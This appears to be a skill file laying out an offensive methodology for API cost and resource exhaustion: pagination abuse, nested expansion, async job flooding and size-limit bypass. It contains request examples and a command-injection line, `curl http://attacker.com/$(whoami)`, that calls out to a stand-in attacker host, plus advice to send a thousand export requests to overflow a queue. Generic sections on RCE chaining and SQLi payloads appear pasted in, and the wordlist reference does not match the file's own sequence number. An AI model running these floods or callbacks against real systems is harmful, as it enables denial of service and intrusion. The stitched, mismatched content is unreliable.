---
name: api-24-cost-resource
sequence: api-24
category: misc
domain: api
description: "API cost/resource exhaustion: pagination abuse, expensive endpoint DoS, async job flooding, nested object expansion, and size limit bypass. Use when testing API resource limits."
wordlist_ref: "wordlists/api/api-18-cost-resource/"
---

# Cost/Resource Exhaustion — API Offensive Methodology

## Quick Workflow

1. Identify endpoints with server-side cost (PDF generation, image processing, large queries)
2. Abuse pagination: request maximum page size repeatedly
3. Abuse nested expansion: expand all relationships
4. Flood async jobs: queue unlimited background tasks
5. Bypass size limits via chunked encoding or compression

---

## Detection

### Pagination Abuse

```
GET /api/users?limit=1000&page=1
GET /api/users?limit=1000&page=2
... (100s of requests)
```

### Nested Expansion

```
GET /api/orders?expand=user,items,payments,shipments,history,notes,attachments
```

### Async Job Flood

```json
POST /api/export
{"format": "pdf", "include": "all"}
```

Send 1000 export requests → queue overflow.

---





## Hacker Mindset

**RCE is the destination, not the starting point.** You usually get there through a chain: SQLi → shell, SSTI → shell, file upload → shell. Each link in the chain is a distinct finding.

**OOB is how you prove blind RCE.** `curl http://attacker.com/$(whoami)` sends a DNS lookup and HTTP request that proves command execution even if no output is returned.

**Simple commands first.** `whoami`, `id`, `hostname`, `sleep 5`. Don't start with destructive commands.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates

## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/api/api-18-cost-resource/`

**Files**:
- `wordlists/api/api-18-cost-resource/payloads/sqli/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- OWASP API4:2023 — Unrestricted Resource Consumption
